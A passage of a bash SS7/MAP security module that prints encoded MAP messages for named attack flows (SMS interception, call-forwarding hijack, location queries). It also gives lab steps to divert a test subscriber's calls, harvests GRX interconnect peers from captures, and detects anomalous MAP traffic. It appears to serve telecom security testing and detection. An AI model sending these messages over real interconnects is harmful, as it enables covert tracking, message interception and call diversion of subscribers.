            printf 'precondition\t%s\n' "an ATI accepted from a calling SSN other than the GMLC (145) or gsmSCF (147)"
            printf 'detection\t%s\n' "ATI arriving with a calling SSN outside {145,146,147} is the classic anomalous case"
            ;;
        sms-intercept)
            printf 'objective\t%s\n' "SRI-SM for the serving MSC of an MSISDN, then MT-ForwardSM toward that MSC"
            printf 'precondition\t%s\n' "SRI-SM answered and the SM-RP-DA accepted without a serving-node binding check"
            printf 'detection\t%s\n' "SRI-SM from an SMSC the HLR does not peer with; repeated SM-RP-DA for the same IMSI from a new point code"
            ;;
        forward-hijack)
            printf 'objective\t%s\n' "register a call-forwarding-unconditional number, then activate it, so MT calls divert"
            printf 'precondition\t%s\n' "registerSS/activateSS accepted from an interconnect peer and an SS password not enforced"
            printf 'detection\t%s\n' "registerSS(ss-Code=cfu) or activateSS(cfu) from a point code with no subscriber-service role"
            ;;
    esac
    local i=1
    for op in ${seq//,/ }; do
        msu=$(ss7_flow_build_step "$flow" "$i" "$msisdn" "$imsi" "$opc" "$dpc") || return 1
        printf 'step\t%s\t%s\t%s\t%s\t%s\n' "$i" "request" "$op" \
            "$(ss7_map_opcode_name "$op")" "${#msu}"
        printf 'step_hex\t%s\t%s\n' "$i" "$msu"
        i=$(( i + 1 ))
    done
    printf 'note\t%s\n' "these are real encoded MSUs; transmitting them needs the lab STP named by --plan stp-lab"
    return 0
}

# ── GRX / IPX interconnect (attacks O9, O20) ────────────────────────────
# GSMA IR.34 defines the GRX as the private IP backbone that carries GPRS
# roaming between operators, and IR.88 the security expectations on it.
# The trust model is the point: a GRX/IPX peer is reachable because it is a
# contracted roaming partner, so the receiving operator's border treats it as
# authorised and applies no per-message authorisation to the signalling it
# carries. That is why a single compromised or rented GRX port turns into
# interconnect-wide MAP reachability.
ss7_grx_reference() {
    cat <<'EOF'
key	value	note
grx	GSMA IR.34	the private IP backbone carrying GPRS roaming between operators
ipx	GSMA IR.34 / IR.77	inter-service-provider IP exchange; carries GRX, signalling and interconnect traffic
transport	GTP-C UDP 2123, GTP-U UDP 2152, SCTP 2905/2904 (M3UA/M2PA)	the roaming interfaces a GRX port exposes
trust_model	peer is authorised by contract, not by message	a contracted peer's source address is allow-listed at the border; individual MAP/TCAP operations inside it are not re-authorised
gt_configuration	global-title routing	the recipient's STP resolves the GT and routes; the origin is not cryptographically bound to the GT it claims
reachability	one GRX port -> many operators	an interconnect port is reachable by every operator behind the same GRX/IPX cloud
gsn_harvesting	from any GRX-reachable capture, GTP-C endpoints name the SGSN/GGSN/MME and their TEIDs	GSN addresses are not secret; the control plane hands them out
exposure	SS7 over IP (SIGTRAN)	SCCP/TCAP carried over M3UA or M2PA keeps the MAP trust model without the physical SS7 barrier
detection	unexpected peer -> MAP opcode	the only per-operator control is SCCP screening at the STP; a peer that passes it can send ATI/SRI-SM/registerSS
EOF
}

# Harvest GSN and signalling peers from a capture. Needs tshark; when it is
# absent this reports MISSING and returns non-zero rather than an empty table.
ss7_grx_recon() {
    local pcap="${1:-}"
    if [[ -z "$pcap" ]]; then
        ss7_grx_reference
        return 0
    fi
    [[ -r "$pcap" ]] || { printf 'ERROR\tcannot read capture: %s\n' "$(ss7_sanitize "$pcap")" >&2; return 1; }
    command -v tshark >/dev/null 2>&1 || {
        printf 'MISSING\ttshark is required to harvest GSN and signalling peers from a pcap\n' >&2
        return 1
    }
    local rows rc=0
    rows=$(tshark -r "$pcap" -n -T fields \
            -e ip.src -e ip.dst -e gtp.teid -e sccp.calling.ssn -e sccp.called.ssn -e gsm_old.opCode \
            2>/dev/null) || rc=1
    (( rc == 0 )) || { printf 'ERROR\ttshark could not read %s\n' "$(ss7_sanitize "$pcap")" >&2; return 1; }
    printf 'mode\tcapture\n'
    printf 'capture\t%s\n' "$(ss7_sanitize "$pcap")"
    printf 'header\tpeer_ip\trole\tssn\topcode\n'
    local line
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        ss7_split "$line"
        local src="${SS7_F[0]:-}" dst="${SS7_F[1]:-}" teid="${SS7_F[2]:-}"
        local cssn="${SS7_F[3]:-}" dssn="${SS7_F[4]:-}" opc="${SS7_F[5]:-}"
        [[ -z "$src$dst$cssn$dssn$opc" ]] && continue
        if [[ -n "$opc" ]]; then
            printf 'map_peer\t%s\t%s\t%s\t%s\n' \
                "$(ss7_sanitize "${src:-?}")" "MAP/TCAP" \
                "$(ss7_sanitize "${cssn:-?}")->$(ss7_sanitize "${dssn:-?}")" \
                "$(ss7_sanitize "$opc")"
        elif [[ -n "$teid" ]]; then
            printf 'gsn_peer\t%s\t%s\t%s\t%s\n' \
                "$(ss7_sanitize "${src:-?}")" "GTP-C/U" "-" "$(ss7_sanitize "$teid")"
        elif [[ -n "$src" ]]; then
            printf 'ip_peer\t%s\t%s\t%s\t%s\n' "$(ss7_sanitize "$src")" "ip" "-" "-"
        fi
    done <<<"$rows"
    printf 'note\t%s\n' "a GRX/IPX peer is trusted by contract; per-message authorisation is absent unless the STP screens it"
    return 0
}

# ── detection: the HLR-side view of an anomalous MAP query ──────────────
# Pure function over TSV rows "frame calling_ssn called_ssn opcode". Keeping
# it separate from the pcap reader makes it unit-testable without a capture.
# The routing context that makes a finding actionable: an operator can act on
# "this interconnect peer asked", not on "opcode 71 appeared". Field names are
# the ones Wireshark actually defines -- `sccp.calling.digits` /
# `sccp.called.digits`, since there is no `sccp.calling.gt` field.
ss7_detect_route() {  # <opc> <dpc> <calling-digits> <called-digits>
    local out="" sep=""
    if [[ -n "${1:-}" || -n "${2:-}" ]]; then out="OPC ${1:-?} -> DPC ${2:-?}"; sep=", "; fi
    if [[ -n "${3:-}" ]]; then out+="${sep}calling GT ${3}"; sep=", "; fi
    if [[ -n "${4:-}" ]]; then out+="${sep}called GT ${4}"; fi
    [[ -n "$out" ]] || return 0
    printf ' [%s]' "$out"
}

# Reads TSV rows: frame, calling SSN, called SSN, opcode, and optionally
# OPC, DPC, calling global title, called global title.
ss7_detect_stream() {
    local frame cssn dssn op opc dpc cgt dgt lineno=0
    local -A seen_op=() first_op_of_pc=() pc_count=()
    local -a rows=()
    local line

    while IFS= read -r line; do
        [[ -n "$line" ]] && rows+=("$line")
    done

    # First pass: the per-point-code baseline. A peer's FIRST message being a
    # subscriber-questioning opcode is the anomaly worth reporting; routine
    # traffic establishes the peer before it ever asks about a subscriber.
    local row
    for row in "${rows[@]}"; do
        ss7_split "$row"
        op="${SS7_F[3]:-}"; opc="${SS7_F[4]:-}"
        [[ -z "$op" ]] && continue
        seen_op["$op"]=$(( ${seen_op[$op]:-0} + 1 ))
        [[ -z "$opc" ]] && continue
        pc_count["$opc"]=$(( ${pc_count[$opc]:-0} + 1 ))
        [[ -n "${first_op_of_pc[$opc]:-}" ]] || first_op_of_pc["$opc"]="$op"
    done

    # Second pass: emit in capture order so the output reads like the capture.
    for row in "${rows[@]}"; do
        ss7_split "$row"
        frame="${SS7_F[0]:-}"; cssn="${SS7_F[1]:-}"; dssn="${SS7_F[2]:-}"; op="${SS7_F[3]:-}"
        opc="${SS7_F[4]:-}"; dpc="${SS7_F[5]:-}"; cgt="${SS7_F[6]:-}"; dgt="${SS7_F[7]:-}"
        lineno=$(( lineno + 1 ))
        [[ -z "$op" ]] && continue
        local opcodename route
        opcodename=$(ss7_map_opcode_name "$op")
        route=$(ss7_detect_route "$opc" "$dpc" "$cgt" "$dgt")
        case "$op" in
            71) # ATI: legitimate callers are the GMLC (145), CAP (146) and gsmSCF (147)
                case "$cssn" in
                    145|146|147|5|6) ;;
                    *) printf 'FINDING\tHIGH\tati-from-non-gmlc\t%s\t%s\topcode 71 (anyTimeInterrogation) with calling SSN %s%s\n' \
                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
                esac ;;
            22) # SRI is normally asked by an MSC/GMSC (8), a VLR (7) or an HLR (6)
                case "$cssn" in
                    6|7|8|149) ;;
                    *) printf 'FINDING\tMEDIUM\tsri-from-unexpected-ssn\t%s\t%s\topcode 22 (sendRoutingInfo) with calling SSN %s%s\n' \
                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
                esac ;;
            45) # SRI-SM is asked by an SMSC; it must not come from a subscriber-facing node
                case "$cssn" in
                    6|8|149) ;;
                    *) printf 'FINDING\tMEDIUM\tsri-sm-from-unexpected-ssn\t%s\t%s\topcode 45 with calling SSN %s%s\n' \
                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
                esac ;;
            2)  # ULR is a VLR->HLR operation
                [[ "$dssn" == "6" ]] || printf 'FINDING\tHIGH\tulr-not-toward-hlr\t%s\t%s\topcode 2 with called SSN %s%s\n' \
                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${dssn:-<empty>}")" "$route"
                [[ "$cssn" == "7" || "$cssn" == "8" ]] || printf 'FINDING\tHIGH\tulr-from-unexpected-vmsc\t%s\t%s\topcode 2 from calling SSN %s%s\n' \
                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
            10|12) # the call-forwarding hijack primitives
                printf 'FINDING\tHIGH\tforwarding-registration\t%s\t%s\topcode %s (%s) toward SSN %s%s\n' \
                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "$op")" "$opcodename" "$(ss7_sanitize "${dssn:-<empty>}")" "$route" ;;
            0) ;;
            *)
                if ! ss7_opcode_known "$op"; then
                    printf 'FINDING\tLOW\tunknown-opcode\t%s\t%s\topcode %s is not assigned in TS 29.002%s\n' \
                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "$op")" "$route"
                fi ;;
        esac
    done

    # A point code whose very first message in the capture is a query about a
    # subscriber never announced itself with routine traffic. That is the
    # hit-and-run shape, and it names the peer.
    local pc fop
    for pc in "${!first_op_of_pc[@]}"; do
        [[ -n "$pc" ]] || continue
        fop="${first_op_of_pc[$pc]}"
        case "$fop" in
            71|22|45|2|10|12)
                printf 'FINDING\tHIGH\tfirst-message-is-a-query\t-\t%s\tOPC %s appears %s time(s) in the capture and its first message is opcode %s\n' \
                    "$(ss7_map_opcode_name "$fop")" "$(ss7_sanitize "$pc")" "${pc_count[$pc]}" "$(ss7_sanitize "$fop")" ;;
        esac
    done

    # A single opcode repeated beyond any plausible retransmission count is a
    # flood, not a query pattern.
    local k
    for k in "${!seen_op[@]}"; do
        if (( ${seen_op[$k]} >= 50 )); then
            printf 'FINDING\tHIGH\topcode-flood\t-\t%s\topcode %s seen %s times\n' \
                "$(ss7_map_opcode_name "$k")" "$(ss7_sanitize "$k")" "${seen_op[$k]}"
        fi
    done
    return 0
}

ss7_cmd_detect() {
    local pcap="${1:-}"
    [[ -n "$pcap" ]] || { printf 'ERROR\tusage: --detect <pcap>\n' >&2; return 2; }
    [[ -r "$pcap" ]] || { printf 'ERROR\tcannot read capture: %s\n' "$(ss7_sanitize "$pcap")" >&2; return 1; }
    command -v tshark >/dev/null 2>&1 || { printf 'MISSING\ttshark is required for pcap detection\n' >&2; return 1; }
    local rows
    # The routing label and the global title are what make a finding
    # actionable, so they are extracted alongside the SSN and opcode. The
    # global title lives in sccp.calling.digits / sccp.called.digits;
    # tshark defines no sccp.calling.gt field.
    rows=$(tshark -r "$pcap" -n -T fields \
        -e frame.number -e sccp.calling.ssn -e sccp.called.ssn -e gsm_old.opCode \
        -e mtp3.opc -e mtp3.dpc -e sccp.calling.digits -e sccp.called.digits 2>/dev/null) || {
        printf 'ERROR\ttshark could not read %s\n' "$(ss7_sanitize "$pcap")" >&2; return 1
    }
    printf 'capture\t%s\n' "$(ss7_sanitize "$pcap")"
    printf 'header\tseverity\trule\tframe\toperation\tdetail\n'
    printf '%s\n' "$rows" | ss7_detect_stream
    return 0
}

# ── attack surface notes ────────────────────────────────────────────────
ss7_surface_notes() {
    cat <<'EOF'
surface	protocol	precondition	impact	note
sri-any-msisdn	MAP/TCAP	interconnect MAP reachability to an HLR	silent subscriber tracking	an SRI for an MSISDN returns the IMSI and the serving VMSC; the HLR answers because the query is syntactically valid, not because the caller is entitled to it
sri-sm-sms-intercept	MAP/TCAP	SRI-SM answered and the serving MSC accepts MT-ForwardSM	interception of mobile-terminated SMS	the flow that turns an SRI-SM into a message-intercept: locate the SMSC path, then present the SM at the serving MSC
register-ss-forward-hijack	MAP/TCAP	registerSS/activateSS accepted from a non-VLR origin	all inbound calls divert to an attacker number	the Nohl 2014 demonstration: supplementary-service management is ordinary MAP, so an interconnect peer can register call forwarding for another subscriber
ati-location	MAP/TCAP	ATI accepted from a calling SSN outside the GMLC set	location tracking without the subscriber's knowledge	the GMLC is the only legitimate ATI origin; an ATI from anything else is the anomaly
grx-interconnect-trust	GRX/IPX	one contracted roaming port	reachability to every operator behind the same GRX/IPX	a GRX peer is authorised by contract; individual MAP operations inside the peer are not re-authorised
gsn-harvesting	GTP-C/GTP-U	GRX-reachable control plane	core-node inventory	the GSN addresses and TEIDs are handed out on the control plane; no authentication is required to read them
sccp-screening-absent	SCCP	STP without an SSN/GT origin rule	one peer can send any MAP opcode	the STP is the only per-message control point; without an SCCP screening rule the trust is transitive
EOF
}

# ── plans — status: handoff ─────────────────────────────────────────────
ss7_plan_write() {
    local name="$1" title="$2" needs="$3" body="$4"
    mkdir -p "$SS7_PLANS" || { printf 'ERROR\tcannot create %s\n' "$SS7_PLANS" >&2; return 1; }
    local out="$SS7_PLANS/${name}.plan"
    {
        printf 'status: handoff\n'
        printf 'plan: %s\n' "$title"
        printf 'module: 26_ss7_map.sh (ss7)\n'
        printf 'requires: %s\n' "$needs"
        printf 'generated: %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
        printf '\n'
        printf '%s\n' "$body"
    } > "$out" || { printf 'ERROR\tcould not write %s\n' "$out" >&2; return 1; }
    [[ -s "$out" ]] || { printf 'ERROR\t%s is empty\n' "$out" >&2; return 1; }
    printf '%s' "$out"
}

ss7_plan_stp_lab() {
    local body
    body=$(cat <<'EOF'
# Lab STP for SS7/MAP vectors — handoff

## What the handoff needs
1. A lab STP reachable over M3UA/SCTP on port 2905 (or M2PA on 2904), with a
   signalling point code assigned to this test node. Osmocom's
   libosmo-sccp + osmo-stp, or a commercial STP in a test rack, both work.
2. An HLR/VLR pair behind that STP holding a test IMSI and a test MSISDN
   (Osmocom osmo-hlr + osmo-msc, or a commercial core on a test PLMN).
3. SCCP routing configured so a Global Title for the test MSISDN resolves to
   the test HLR, and an SSN route for 6/7/8 exists from the test point code.
4. The test STP's SCCP screening rules disabled (or set to allow this point
   code) — with screening on, the vectors do not run and that is the finding.

## What is already implemented in software
- MTP3 routing label with 14-bit ITU point codes in every structured form,
  service information octet, MTP2 LSSU and MTP3 SNM names.
- SCCP UDT/UDTS with called/calling party addresses and SSNs, and the
  three-pointer layout Wireshark 4.2.2 parses.
- TCAP BEGIN/component portions and the MAP operations the flows use.
- Wire-ready MSUs for SRI, SRI-SM, ATI, PSI, ULR, ISD, SAI, registerSS and
  activateSS. `26_ss7_map.sh --flow <name>` prints them.

## Steps
1. Bring the lab STP up and confirm an M3UA ASP is ACTIVE from this host.
2. `26_ss7_map.sh --build-sri <test-msisdn>` and send the MSU as the M3UA
   DATA payload on the active ASP.
3. Read the SRI result from the SRI-Response and confirm the IMSI and VMSC.
4. `26_ss7_map.sh --flow forward-hijack` and send registerSS then activateSS.
5. Place an MT call to the test MSISDN and confirm it diverts to the number
   used in the registerSS argument.
6. Compare against `--flow intercept` and `--flow locate` on the same node.

## Safety
Every one of these operations changes state for a real subscriber: SRI leaks
location, registerSS/activateSS diverts calls. Only a test IMSI/MSISDN
provisioned for the exercise, on a network you own or are contracted to test.
EOF
)
    ss7_plan_write "stp-lab" "Lab STP (M3UA/SCTP 2905 or M2PA 2904) for SS7/MAP vectors" \
        "a lab STP reachable over M3UA/SCTP 2905 (or M2PA 2904) with an assigned signalling point code, plus a test HLR/VLR holding a test IMSI and a test MSISDN" \
        "$body"
}

ss7_plan_ipx_path() {
    local body
    body=$(cat <<'EOF'
# IPX/GRX path walk — handoff

## What the handoff needs
1. An SS7 test interconnect: two lab networks, each with its own STP and
   point code, joined by a signalling transfer point that emulates the IPX/IP
   role (osmo-stp in two instances with an M3UA IPSP between them).
2. An SGSN/GGSN or MME/SGW pair in each lab so GTP-C and GTP-U are carrying
   real TEIDs across the interconnect.
3. A capture point on the interconnect link (the IPX-facing interface), which
   is the only place the trust model is visible.

## What is already implemented in software
- `--grx-recon <pcap>` harvests GSN and MAP peers from a capture with tshark
  and reports the SS7/MAP or GTP role of each address.
- `--grx-recon` with no capture prints the IR.34/IR.88 reference trust model:
  peer authorisation is by contract, per-message authorisation is absent.
- The MAP and GTP codecs needed to read whatever the interconnect carries.

## Steps
1. Bring both lab networks up and confirm GTP-C reachability across the
   interconnect (a Create Session crossing the IPX-like hop).
2. Capture on the interconnect interface and run `--grx-recon <pcap>`.
3. Confirm that the harvested GSN addresses include nodes the far side never
   intended to expose, and that no per-message authorisation stopped a MAP
   opcode the receiving STP did not expect.
4. Add an SCCP screening rule at the receiving STP for the opcode set the peer
   should be allowed to send, and re-run to show the exposure closes.

## Safety
Walking a production IPX is an interconnect-policy violation and can move
real roaming traffic. This is a two-lab-network exercise only.
EOF
)
    ss7_plan_write "ipx-path" "IPX/GRX interconnect path walk with two lab networks" \
        "two lab networks each with an STP and point code, joined by an STP emulating the IPX role (M3UA IPSP), plus an SGSN/GGSN or MME/SGW pair per side and a capture point on the interconnect" \
        "$body"
}

ss7_cmd_plan() {
    local which="${1:-}" pf rc
    case "$which" in
        stp-lab)  pf=$(ss7_plan_stp_lab);  rc=$? ;;
        ipx-path) pf=$(ss7_plan_ipx_path); rc=$? ;;
        *)
            printf 'ERROR\tunknown plan: %s (want stp-lab|ipx-path)\n' "$(ss7_sanitize "${which:-<none>}")" >&2
            return 2 ;;
    esac
    [[ "$rc" -eq 0 && -n "$pf" ]] || return "${rc:-1}"
    printf 'plan_file\t%s\n' "$pf"
    printf 'status\thandoff\n'
    printf 'note\t%s\n' "this vector needs the testbed named in the plan; no traffic was sent"
    return 0
}

# ── hardware guard: name what is missing ────────────────────────────────
ss7_find_stp() {
    local t found=""
    for t in osmo-stp osmo-stp-m3ua ss7-stp; do
        command -v "$t" >/dev/null 2>&1 && found+="${found:+,}$t"
    done
    [[ -n "$found" ]] && { echo "$found"; return 0; }
    return 1
}

ss7_require_stp() {
    local s; s=$(ss7_find_stp) || {
        printf 'ERROR\tno lab STP — install Osmocom osmo-stp (libosmo-sccp) or point at an SS7 test interconnect; see --plan stp-lab\n' >&2
        return 1
    }
    printf 'OK\t%s\n' "$s"
}

# ── CLI verbs ───────────────────────────────────────────────────────────
ss7_cli_status_tsv() {
    local plans=0 captures=0
    [[ -d "$SS7_PLANS" ]] && plans=$(find "$SS7_PLANS" -name '*.plan' -type f 2>/dev/null | wc -l)
    [[ -d "$CAPTURES_DIR" ]] && captures=$(find "$CAPTURES_DIR" -maxdepth 1 -name '*.pcap*' -type f 2>/dev/null | wc -l)
    printf 'module\tss7_map\n'
    printf 'tag\tss7\n'
    printf 'dir\t%s\n' "$SS7_DIR"
    printf 'plans_dir\t%s\n' "$SS7_PLANS"
    printf 'plans\t%s\n' "$plans"
    printf 'captures\t%s\n' "$captures"
    printf 'stp\t%s\n' "$(ss7_find_stp 2>/dev/null || echo none)"
    printf 'tshark\t%s\n' "$(command -v tshark >/dev/null 2>&1 && echo yes || echo no)"
    printf 'flows\tintercept,locate,sms-intercept,forward-hijack\n'
    printf 'refs\tITU-T Q.703/Q.704/Q.713/Q.773/Q.774, TS 29.002, TS 23.003, GSMA IR.34/IR.88\n'
    printf 'decode_only\t%s\n' "$(ss7_find_stp >/dev/null 2>&1 && echo no || echo yes)"
}

ss7_cmd_decode_tcap() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-tcap <hex>\n' >&2; return 2; }
    ss7_tcap_parse "$hex"
}

ss7_cmd_decode_map() {
    local hex; hex=$(ss7_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-map <hex>\n' >&2; return 2; }
    ss7_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    # Accept a bare TCAP message, a bare SCCP message, or a full MSU.
    local mtc=""
    case "${hex:0:2}" in
        61|62|64|65|67) mtc="$hex" ;;
        09|0a|11|12|13|14)
            printf 'layer\tsccp\n'
            ss7_sccp_parse "$hex"
            mtc=$(ss7_sccp_parse "$hex" | awk -F'\t' '$1=="sccp_data"{print $2; exit}')
            ;;
        83|84|85)
            printf 'layer\tmtp3\n'
            ss7_sio_parse "${hex:0:2}"
            ss7_label_parse "${hex:2:8}"
            local sccp="${hex:10}"
            printf 'layer\tsccp\n'
            ss7_sccp_parse "$sccp"
            mtc=$(ss7_sccp_parse "$sccp" | awk -F'\t' '$1=="sccp_data"{print $2; exit}')
            ;;
        *) printf 'ERROR\tunrecognised envelope (want a TCAP tag 61/62/64/65/67, an SCCP type 09/0a/11, or an MSU SIO 83)\n' >&2; return 1 ;;
    esac
    [[ -n "$mtc" ]] || { printf 'ERROR\tno TCAP payload found in the envelope\n' >&2; return 1; }
    printf 'layer\ttcap\n'
    ss7_tcap_parse "$mtc"
}

ss7_cmd_decode_msu() {
    local hex; hex=$(ss7_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-msu <hex>\n' >&2; return 2; }
    ss7_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    printf 'layer\tmtp3\n'
    ss7_sio_parse "${hex:0:2}"
    ss7_label_parse "${hex:2:8}"
    printf 'layer\tsccp\n'
    local out data
    out=$(ss7_sccp_parse "${hex:10}") || { printf '%s\n' "$out"; return 1; }
    printf '%s\n' "$out"
    # The SCCP user here is always TCAP on a MAP interface, and the whole point
    # of decoding an MSU is to reach the operation inside it: stop at the SCCP
    # user data and the operator still has to run the hex through --decode-tcap.
    data=$(printf '%s\n' "$out" | awk -F'\t' '$1 == "sccp_data" { print $2; exit }')
    if [[ -n "$data" && "${data:0:2}" =~ ^6[1-7]$ ]]; then
        printf 'layer\ttcap\n'
        ss7_tcap_parse "$data" || return 1
    fi
}

# ── SIGTRAN: SCTP + M3UA ────────────────────────────────────────────────
# Real interconnect traffic is SCTP/M3UA, not bare MTP3, and this module's
# own plan hands the MSU to the lab STP as the M3UA payload -- so without
# this layer the operator has to strip two headers by hand before
# --decode-msu sees anything. Every offset below is from the RFCs:
#   SCTP common header 12 octets, source port first (RFC 4960 §3.1)
#   SCTP chunk header 4 octets; a DATA chunk header is 16 octets, with the
#     Payload Protocol Identifier at offset 12 of the chunk (RFC 4960 §3.3.1)
#   M3UA runs in a DATA chunk with PPID 3 (RFC 4666 §7.1)
#   M3UA common header 8 octets, all fields network byte order, length
#     including the header and any parameter padding (RFC 4666 §3.1)
#   M3UA parameters are Tag(2) Length(2) Value; Length includes the 4-octet
#     tag and length but NOT the padding, and the value is padded with at
#     most 3 zero octets to a 4-octet boundary (RFC 4666 §3.2)
ss7_sctp_chunk_name() {
    case "${1:-0}" in
        0)  printf 'DATA' ;;
        1)  printf 'INIT' ;;
        2)  printf 'INIT ACK' ;;
        3)  printf 'SACK' ;;
        4)  printf 'HEARTBEAT' ;;
        5)  printf 'HEARTBEAT ACK' ;;
        6)  printf 'ABORT' ;;
        7)  printf 'SHUTDOWN' ;;
        8)  printf 'SHUTDOWN ACK' ;;
        9)  printf 'ERROR' ;;
        10) printf 'COOKIE ECHO' ;;
        11) printf 'COOKIE ACK' ;;
        14) printf 'SHUTDOWN COMPLETE' ;;
        15) printf 'AUTH' ;;
        *)  printf 'unknown chunk type %s' "$1" ;;
    esac
}

ss7_m3ua_class_name() {
    case "${1:-0}" in
        0)      printf 'MGMT (management)' ;;
        1)      printf 'Transfer' ;;
        2)      printf 'SSNM (SS7 signalling network management)' ;;
        3)      printf 'ASPSM (ASP state maintenance)' ;;
        4)      printf 'ASPTM (ASP traffic maintenance)' ;;
        5|6|7|8) printf 'reserved for other SIGTRAN adaptation layers' ;;
        9)      printf 'RKM (routing key management)' ;;
        *)      printf 'unknown class %s' "$1" ;;
    esac
}

ss7_m3ua_type_name() {  # <class> <type>
    case "${1:-0}:${2:-0}" in
        0:0) printf 'ERR' ;; 0:1) printf 'NTFY' ;;
        1:1) printf 'DATA' ;;
        2:1) printf 'DUNA' ;; 2:2) printf 'DAVA' ;; 2:3) printf 'DAUD' ;;
        2:4) printf 'SCON' ;; 2:5) printf 'DUPU' ;; 2:6) printf 'DRST' ;;
        3:1) printf 'ASPUP' ;; 3:2) printf 'ASPDN' ;; 3:3) printf 'BEAT' ;;
        3:4) printf 'ASPUP ACK' ;; 3:5) printf 'ASPDN ACK' ;; 3:6) printf 'BEAT ACK' ;;
        4:1) printf 'ASPAC' ;; 4:2) printf 'ASPIA' ;;
        4:3) printf 'ASPAC ACK' ;; 4:4) printf 'ASPIA ACK' ;;
        9:1) printf 'REG REQ' ;; 9:2) printf 'REG RSP' ;;
        9:3) printf 'DEREG REQ' ;; 9:4) printf 'DEREG RSP' ;;
        *)   printf 'unspecified' ;;
    esac
}

# The argument is the DECIMAL tag: bash `case` patterns are globs, so a
# literal `0x0210` pattern never matches the number 528. The hex value is
# given in the comment beside each arm.
ss7_m3ua_tag_name() {
    case "${1:-0}" in
        3)   printf 'Protocol Version (0x0003)' ;;
        4)   printf 'Activation (0x0004)' ;;
        5)   printf 'Reason (0x0005)' ;;
        6)   printf 'Routing Context (0x0006)' ;;
        7)   printf 'Diagnostic Info (0x0007)' ;;
        9)   printf 'Heartbeat Data (0x0009)' ;;
        11)  printf 'Traffic Mode Type (0x000B)' ;;
        12)  printf 'Error Code (0x000C)' ;;
        13)  printf 'Status (0x000D)' ;;
        18)  printf 'INFO String (0x0012)' ;;
        19)  printf 'Correlation Id (0x0013)' ;;
        512) printf 'Network Appearance (0x0200)' ;;
        516) printf 'User/Cause (0x0204)' ;;
        517) printf 'Congestion Indication (0x0205)' ;;
        518) printf 'Concerned Destination (0x0206)' ;;
        528) printf 'Protocol Data (0x0210, the SS7 MTP3 message)' ;;
        *)   printf 'tag 0x%04X' "$1" ;;
    esac
}

# Walk the SCTP datagram and print every chunk header, then the M3UA payload
# of the first DATA chunk. The ports and verification tag are printed because
# they identify the association; without them a finding cannot be tied to a
# signalling peer.
ss7_sctp_strip() {  # <hex>
    local hex; hex=$(ss7_nfc "${1:-}")
    local hexlen=${#hex}
    (( hexlen >= 24 )) || { printf 'ERROR\tSCTP needs at least a 12-octet common header\n' >&2; return 1; }
    ss7_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    printf 'sctp_sport\t%s\n' "$(( 16#${hex:0:2}${hex:2:2} ))"
    printf 'sctp_dport\t%s\n' "$(( 16#${hex:4:2}${hex:6:2} ))"
    printf 'sctp_vtag\t0x%s\n' "${hex:8:8}"
    # `off` is a HEX-CHARACTER offset into the string, not an octet count:
    # the 12-octet SCTP common header is the first 24 characters.
    local off=24 type flags clen pad payload ppid tsn sid ssn found=0
    while (( off + 8 <= hexlen )); do
        type=$(( 16#${hex:$off:2} ))
        flags=$(( 16#${hex:$(( off + 2 )):2} ))
        clen=$(( 16#${hex:$(( off + 4 )):4} ))
        (( clen >= 4 )) || { printf 'ERROR\tchunk length %s is below its 4-octet header\n' "$clen" >&2; return 1; }
        (( off + clen * 2 <= hexlen )) || {
            printf 'ERROR\tchunk length %s runs past the datagram\n' "$clen" >&2; return 1; }
        printf 'chunk_type\t%s\n'   "$type"
        printf 'chunk_name\t%s\n'   "$(ss7_sctp_chunk_name "$type")"
        printf 'chunk_flags\t%s\n'  "$flags"
        printf 'chunk_octets\t%s\n' "$clen"
        if (( type == 0 && found == 0 )); then
            (( clen >= 16 )) || { printf 'ERROR\tDATA chunk shorter than its 16-octet header\n' >&2; return 1; }
            # Offsets inside the chunk, again in hex characters: TSN at
            # octet 4 (+8 chars), stream id at octet 8 (+16), stream sequence
            # at octet 10 (+20), PPID at octet 12 (+24), user data at octet
            # 16 (+32).
            tsn=$(( 16#${hex:$(( off + 8 )):8} ))
            sid=$(( 16#${hex:$(( off + 16 )):4} ))
            ssn=$(( 16#${hex:$(( off + 20 )):4} ))
            ppid=$(( 16#${hex:$(( off + 24 )):8} ))
            printf 'data_tsn\t%s\n'     "$tsn"
            printf 'data_stream\t%s\n'  "$sid"
            printf 'data_ssn\t%s\n'     "$ssn"
            printf 'data_ppid\t%s\n'    "$ppid"
            printf 'data_ppid_name\t%s\n' "$( (( ppid == 3 )) && printf 'M3UA' || printf 'not M3UA (0 unspecified, 3 M3UA)' )"
            payload="${hex:$(( off + 32 )):$(( clen * 2 - 32 ))}"
            printf 'data_payload\t%s\n' "$payload"
            found=1
        fi
        pad=$(( ( 4 - clen % 4 ) % 4 ))
        off=$(( off + clen * 2 + pad * 2 ))
    done
    (( found == 1 )) || { printf 'ERROR\tno DATA chunk in the datagram\n' >&2; return 1; }
    return 0
}

ss7_m3ua_parse() {  # <hex>
    local hex; hex=$(ss7_nfc "${1:-}")
    local hexlen=${#hex}
    (( hexlen >= 16 )) || { printf 'ERROR\tM3UA needs at least an 8-octet common header\n' >&2; return 1; }
    local ver res class type len
    ver=$(( 16#${hex:0:2} ))
    res=$(( 16#${hex:2:2} ))
    class=$(( 16#${hex:4:2} ))
    type=$(( 16#${hex:6:2} ))
    len=$(( 16#${hex:8:8} ))
    printf 'm3ua_version\t%s\n'      "$ver"
    printf 'm3ua_reserved\t%s\n'     "$res"
